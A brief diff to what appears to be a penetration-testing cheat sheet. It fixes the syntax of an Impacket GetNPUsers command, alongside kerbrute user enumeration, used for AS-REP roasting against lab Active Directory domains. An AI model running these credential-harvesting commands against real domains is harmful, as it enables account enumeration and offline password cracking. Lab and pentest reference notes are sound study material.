@@ -122,7 +122,7 @@ kerbrute userenum -d test.local usernames.txt
 ### Impacket
 
 ```
-impacket-GetNPUsers -no-pass -dc-ip 10.10.10.192 blackfield.local
+impacket-GetNPUsers -no-pass -dc-ip 10.10.10.192 blackfield.local/
 GetNPUsers.py -no-pass -usersfile names.txt -format hashcat -dc-ip 10.10.10.169 MEGABANK.LOCAL/
 ```
 
